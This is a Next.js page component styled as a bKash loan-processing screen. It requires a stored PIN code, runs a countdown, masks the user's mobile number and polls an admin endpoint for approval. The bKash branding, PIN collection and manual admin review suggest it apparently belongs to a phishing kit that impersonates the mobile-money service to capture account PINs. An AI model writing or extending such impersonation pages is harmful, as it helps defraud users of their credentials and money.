'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useLoan } from '@/context/LoanContext';

export default function Processing() {
  const router = useRouter();
  const { loanData } = useLoan();
  const [countdown, setCountdown] = useState(15);
  const [showStatus, setShowStatus] = useState(false);
  const [adminStatus, setAdminStatus] = useState<'pending' | 'approved' | 'rejected'>('pending');

  useEffect(() => {
    if (!loanData.pin_code) {
      router.push('/verify-pin');
    }
  }, [loanData, router]);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setShowStatus(true);
      startCheckingStatus();
    }
  }, [countdown]);

  const startCheckingStatus = () => {
    if (!loanData.id) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/loan/status?id=${loanData.id}`);
        const data = await res.json();
        
        if (data.admin_action === 'approved') {
          clearInterval(interval);
          router.push('/loan-success');
        } else if (data.admin_action === 'rejected') {
          clearInterval(interval);
          router.push('/loan-failed');
        }
        setAdminStatus(data.admin_action || 'pending');
      } catch (err) {
        console.error('Failed to check status:', err);
      }
    }, 2000);

    return () => clearInterval(interval);
  };


  const maskedMobile = loanData.mobile_number 
    ? loanData.mobile_number.substring(0, 3) + 'XXXX' + loanData.mobile_number.substring(7)
    : '';

  return (
    <div className="bg-gray-100 flex items-center justify-center min-h-screen p-4">
      <div className="bg-white p-6 rounded-xl shadow-md w-full max-w-md text-center">
        
        {/* bKash Header */}
        <div className="flex items-center justify-center mb-6">
          <img src="/img/bKash-logo.png" alt="bKash Logo" className="w-32 h-12 object-contain" />
        </div>
        
        {/* Red Line */}
        <div className="w-full h-0.5 bg-red-500 mb-6"></div>
        
        {/* Processing Animation */}
        <div className="mb-6">
          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-pink-500 mx-auto mb-4"></div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">Processing Your Request</h2>
          <p className="text-gray-600 text-sm">Please wait while we verify your loan application...</p>
        </div>
        
        {/* Countdown Timer */}
        {!showStatus ? (
          <div className="mb-6">
            <div className="bg-pink-50 border border-pink-200 rounded-lg p-4">
              <p className="text-pink-700 font-medium mb-2">Verification in progress</p>
              <div className="text-2xl font-bold text-pink-600">{countdown}</div>
              <p className="text-sm text-pink-600">seconds remaining</p>
            </div>
          </div>
        ) : (
          <div className="mb-6">
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
              <p className="text-blue-700 font-medium">Waiting for approval...</p>
              <p className="text-sm text-blue-600 mt-1">Your request has been sent to our team for review.</p>
            </div>
          </div>
        )}
        
        {/* Loan Details */}
        <div className="bg-gray-50 rounded-lg p-4">
          <h3 className="font-semibold text-gray-800 mb-3">Loan Details</h3>
          <div className="space-y-2 text-sm text-left">
            <div className="flex justify-between border-b border-gray-200 pb-1">
              <span className="text-gray-600">Amount:</span>
              <span className="font-medium">৳{loanData.amount?.toLocaleString()}</span>
            </div>
            <div className="flex justify-between border-b border-gray-200 pb-1">
              <span className="text-gray-600">Category:</span>
              <span className="font-medium">{loanData.category}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Mobile:</span>
              <span className="font-medium">{maskedMobile}</span>
            </div>
          </div>
        </div>
        
      </div>
    </div>
  );
}
